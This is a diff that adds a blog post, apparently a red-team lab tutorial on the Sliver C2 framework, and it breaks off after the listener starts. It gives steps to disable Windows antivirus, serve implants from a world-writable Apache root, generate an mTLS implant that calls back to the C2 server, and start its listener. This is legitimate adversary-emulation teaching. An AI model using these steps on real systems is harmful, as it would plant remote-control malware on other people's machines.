@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (02) - Beacons and Sessions | text/plain</title>
+    <meta name="description" content="This post is about how to use Sliver implants (C2 agents) to remote-control target computers
+from a Sliver C2 server. I&#39;ll showcase both the session mode, which establishes
+an interactive session with immediate command execution and feedback, and the 
+beacon mode, which makes the implant connect back and fetch jobs in regular intervals.
+To make following along easy, some instructions on lab setup are included.
+">
+    <meta name="keywords" content="c2, sliver, red-team, adversary-emulation">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (02) - Beacons and Sessions" />
+<meta property="og:description" content="This post is about how to use Sliver implants (C2 agents) to remote-control target computers
+from a Sliver C2 server. I&#39;ll showcase both the session mode, which establishes
+an interactive session with immediate command execution and feedback, and the 
+beacon mode, which makes the implant connect back and fetch jobs in regular intervals.
+To make following along easy, some instructions on lab setup are included.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_02_beacons_and_sessions/" /><meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-08-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-17T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_02_beacons_and_sessions/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (02) - Beacons and Sessions">
+<meta itemprop="description" content="This post is about how to use Sliver implants (C2 agents) to remote-control target computers
+from a Sliver C2 server. I&#39;ll showcase both the session mode, which establishes
+an interactive session with immediate command execution and feedback, and the 
+beacon mode, which makes the implant connect back and fetch jobs in regular intervals.
+To make following along easy, some instructions on lab setup are included.
+"><meta itemprop="datePublished" content="2022-08-17T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-17T00:00:00+00:00" />
+<meta itemprop="wordCount" content="2637"><meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
+<meta itemprop="keywords" content="c2,sliver,red-team,adversary-emulation," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (02) - Beacons and Sessions</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>13 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2022-08-17T00:00:00&#43;00:00">17 Aug, 2022</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">This post is about how to use Sliver implants (C2 agents) to remote-control target computers
+from a Sliver C2 server. I&#39;ll showcase both the session mode, which establishes
+an interactive session with immediate command execution and feedback, and the 
+beacon mode, which makes the implant connect back and fetch jobs in regular intervals.
+To make following along easy, some instructions on lab setup are included.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a>
+      <ul>
+        <li><a href="#prepare-the-target">Prepare the target</a></li>
+        <li><a href="#prepare-a-delivery-method">Prepare a delivery method</a></li>
+      </ul>
+    </li>
+    <li><a href="#sessions">Sessions</a>
+      <ul>
+        <li><a href="#generating-the-implant">Generating the implant</a></li>
+        <li><a href="#delivering-and-executing-the-implant">Delivering and executing the implant</a></li>
+        <li><a href="#using-a-session">Using a session</a></li>
+      </ul>
+    </li>
+    <li><a href="#beacons">Beacons</a>
+      <ul>
+        <li><a href="#generating-the-implant-1">Generating the implant</a></li>
+        <li><a href="#delivering-and-executing-the-implant-1">Delivering and executing the implant</a></li>
+        <li><a href="#using-a-beacon">Using a beacon</a></li>
+      </ul>
+    </li>
+    <li><a href="#from-beacons-to-sessions">From beacons to sessions</a></li>
+    <li><a href="#profiles">Profiles</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<h2 id="introduction">Introduction</h2>
+<p>This post demonstrates how to use so-called implants to remote-control a target machine from a Sliver C2 server.
+It is a follow-up to the previous one on Sliver C2 server installation
+(<a href="post/learning_sliver_c2_01_installation/">01 - Installation</a>).
+To get familiar with the basics of Sliver, we&rsquo;ll now add a (Windows) target machine to the setup.
+We will then see how to deliver and use a C2 agent,
+which Sliver calls &ldquo;implant&rdquo;. Implants can operate in two different modes.</p>
+<p>If used in session mode, implants create a permanent network connection from the target
+to the C2 server. You can type commands and get immediate feedback, almost as if you
+would be on an SSH or PowerShell Remoting session. This is very convenient to work with,
+but of course such long-running connections might one day cause a few eyebrows to raise.</p>
+<p>If used in beacon mode, implants create temporary network connections back to the target
+at somewhat regular intervals. In between, the implants go to sleep. If you interact with
+a beacon, your commands are not executed immediately. They will instead be queued up and
+executed next time the beacon checks in. This is a little bit less convenient as you&rsquo;ll have
+to wait for the feedback but it may also look a bit less suspicious on the wire (depending on the
+environment, of course).</p>
+<p>Sliver supports several different types of network connections. All can be used for beaconing
+and sessions. For now, we will use mutual TLS (mTLS) connections only.
+Later posts will explore other C2 protocols.</p>
+<p>The grand plan for this post is simple: use Sliver to generate beacon and session implants,
+deliver them to the target in form of a web download, then execute the implants and interact
+with them from the C2 server.</p>
+<p>To do that, a few preparations are required. You&rsquo;ll have to set up a simple lab with a C2 server
+and target machine. I&rsquo;ll cover this first, then we go into the meat of things.</p>
+<h2 id="preparations">Preparations</h2>
+<p>This first section is about preparing the lab setup.
+I assume you went through part <a href="post/learning_sliver_c2_01_installation/">01 - Installation</a>
+before and have a VM with Sliver installed on it.
+This machine will be called the C2 server.</p>
+<p>What&rsquo;s missing is the target we want to control with a C2 agent.
+Since Windows is the most popular operating system (OS),
+let&rsquo;s set up a Windows VM for that.</p>
+<p>My personal setup for this post looked as shown below.
+I&rsquo;ve added my local IPs so that it&rsquo;s easier to follow along
+the code snippets. Ports for the two network services are also included.
+The C2 server will serve files with Apache on port 80
+and accept C2 connections on port 8888.</p>
+<pre tabindex="0"><code>+-------------------+                         +-------------------+
+|                   |         Download binary |                   |
+|     C2 Server     +--80 &lt;-------------------+      Target       |
+|      (Linux)      |                         |     (Windows)     |
+|                   |         C2 Connection   |                   |
+|  192.168.122.111  +--8888 &lt;-----------------+  192.168.122.160  |
+|                   |                         |                   |
++-------------------+                         +-------------------+
+</code></pre><h3 id="prepare-the-target">Prepare the target</h3>
+<p>Go to the <a href="https://www.microsoft.com/en-us/evalcenter">Microsoft Windows Evaluation Center</a>
+and download a copy of Windows.
+I personally used a Windows 10 Enterprise image.
+Use it to create your Windows VM.
+All you need is a basic install.
+The exact build and patch status does not matter much for now.</p>
+<p>After installation, I recommend you disable all endpoint protection features.
+With Antivirus on, your off-the-shelf Sliver implants will die immediately after they start
+or not run at all. You can do it in the GUI by opening &ldquo;Virus &amp; Threat Protection&rdquo;
+settings (just type this into the search bar), then click &ldquo;Manage settings&rdquo;,
+and then turn off all protections. It should look like this afterwards:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/25_sliver_c2_beacons_and_sessions/av_off_gui.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Windows Settings with AV turned off</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h3 id="prepare-a-delivery-method">Prepare a delivery method</h3>
+<p>On your C2 server, run <code>systemctl start apache2</code> to start a web server.
+You can now copy the implants you generate into the folder <code>/var/www/html</code>
+and Apache will serve them.
+To allow any system user to put a payload their, you can run <code>chmod -R 777 /var/www/html</code>.</p>
+<p>Additionally, take a note of your C2 server IP.
+Mine was <code>192.168.122.111</code> at the time of writing:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/]
+└─$ ip addr | grep &#39;inet &#39;
+    inet 127.0.0.1/8 scope host lo
+    inet 192.168.122.111/24 brd 192.168.122.255 scope global dynamic noprefixroute eth0
+</code></pre><p>On the Windows target, confirm that you can reach your C2 server.
+Open the browser and try reach your C2 server on port 80.
+If it works, the Apache default page should load:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/25_sliver_c2_beacons_and_sessions/webserver_works.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Confirmation that the web server works</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Obviously, you also have to make sure the Sliver server itself is started (<code>systemctl start sliver</code>).</p>
+<h2 id="sessions">Sessions</h2>
+<p>To get a session, you can generate an implant, deliver it to the target and execute it there.</p>
+<h3 id="generating-the-implant">Generating the implant</h3>
+<p>Implant generation happens on the C2 server with the <code>generate</code> command.
+Connect to it and run <code>help generate</code> to read the extensive help page and learn about all the flags.
+Here is a selection of the most important flags for now:</p>
+<ul>
+<li><code>--mtls 192.168.122.111</code>: Specifies that the implant should connect to the Sliver server using a mutually authenticated
+TLS connection. Other options would be <code>--wg</code> for WireGuard, <code>--http</code> for HTTP(S) connections or <code>--dns</code> for DNS-based C2.</li>
+<li><code>--os windows</code>: specifies that we want to run the implant on Windows (which is the default, so we could omit this one).
+MacOS and Linux are also supported.</li>
+<li><code>--arch amd64</code>&quot; specifies that we want a 64-bit implant (also the default, could be omitted). Use <code>--arch 386</code> for a 32-bit one.</li>
+<li><code>--format exe</code>: specifies that we want an executable file (again the default). Other options are <code>--format shared</code> for dynamic libraries,
+<code>--format service</code> for a Windows service binary (can be used with the <code>psexec</code> command) and <code>shellcode</code> (only windows).</li>
+<li><code>--save /var/www/html/</code>: specifies the directory to save the binary to. I like to use the Apache web root.</li>
+</ul>
+<p>This is how I generated the binary, which Sliver named <code>MEDICAL_CHANGE.exe</code> for me:</p>
+<pre tabindex="0"><code>sliver &gt; generate --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:18
+[*] Implant saved to /var/www/html/MEDICAL_CHANGE.exe
+</code></pre><p>The file <code>/var/www/html/MEDICAL_CHANGE.exe</code> will not be owned by the Apache system user and has very restrictive file system permissions.
+To make it accessible for Apache, run <code>sudo chown www-data:www-data /var/www/html/MEDICAL_CHANGE.exe</code>.</p>
+<p>Now start the mTLS listener on the C2 server using the <code>mtls</code> command.
+By default, it starts the listener on port 8888.
+You can view your listeners with the <code>jobs</code> command:</p>
+<pre tabindex="0"><code>sliver &gt; mtls
+
+[*] Starting mTLS listener ...
+sliver &gt; 
+[*] Successfully started job #1
+
+sliver &gt; jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    mtls   tcp        8888
